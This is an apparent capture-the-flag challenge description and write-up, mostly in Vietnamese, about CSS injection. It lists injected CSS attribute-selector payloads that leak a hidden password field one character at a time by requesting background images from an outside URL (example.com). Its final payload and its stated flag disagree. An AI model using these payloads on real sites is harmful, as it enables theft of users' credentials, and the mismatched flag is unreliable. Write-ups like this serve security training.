# Mô tả (cung cấp cho CTFer)
Have you heard of CSS injection?
select your favorite color and display on amdin at /admin

## Writeup
trong giao diện được cung cấp bạn có thể thấy rằng có một mục input nơi chúng ta có thể nhập color mình muốn. Ngoài ra còn có một trường ẩn, giá trị của nó được lấy từ cookie.

tìm hiểu trên payload all of thing bạn sẽ thấy payload sau:
blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');

ví dụ: bạn có thể test thử từng cái một như sau:
input[type="password"][value^="a"] {background-image: url('https://example.com?a');}
input[type="password"][value^="b"] {background-image: url('https://example.com?b');}
input[type="password"][value^="c"] {background-image: url('https://example.com?c');}
...

Do đó, điều này sẽ cho bạn biết những ký tự nào đúng và phù hợp. Cứ như vậy cho tới khi tìm thấy toàn bộ password.
Khi ký tự đầu tiên bị phát hiện bạn có thể tiếp tục để phát hiện các ký tự tiếp theo.

input[type="password"][value^="fa"] {background-image: url('https://example.com?fa');}
input[type="password"][value^="fb"] {background-image: url('https://example.com?fb');}
input[type="password"][value^="fl"] {background-image: url('https://example.com?fl');}
...

cứ như vậy cho tới khi thấy flag.
blue;} input[type="password"][value^="flag{cssxss}"] {background-image: url('https://example.com?flag{cssxss}');

flag: flag{cssinjection}


